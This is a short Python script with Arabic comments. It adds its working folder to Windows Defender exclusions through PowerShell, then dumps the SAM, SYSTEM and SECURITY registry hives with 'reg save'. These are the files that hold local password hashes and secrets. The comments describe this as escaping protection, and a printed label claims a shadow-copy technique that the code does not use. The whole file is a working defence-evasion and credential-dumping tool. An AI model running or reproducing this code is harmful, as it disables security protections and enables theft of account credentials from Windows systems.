import subprocess
import os

def bypass_and_dump():
    current_dir = os.getcwd()
    print(f"[*] Adding {current_dir} to Defender exclusions...")
    
    # إضافة الفولدر للاستثناءات
    add_excl = f'powershell -Command "Add-MpPreference -ExclusionPath \'{current_dir}\'"'
    subprocess.run(add_excl, shell=True, capture_output=True)

    print("[*] Dumping hives using Shadow Copy technique...")
    # استخدام reg copy للهرب من الحماية المباشرة
    cmds = [
        'reg save HKLM\\SAM sam.save /y',
        'reg save HKLM\\SYSTEM system.save /y',
        'reg save HKLM\\SECURITY security.save /y'
    ]
    
    for cmd in cmds:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] Saved: {cmd.split()[2]}")
        else:
            print(f"[-] Failed: {cmd.split()[2]} | Error: {result.stderr.strip()}")

if __name__ == "__main__":
    bypass_and_dump()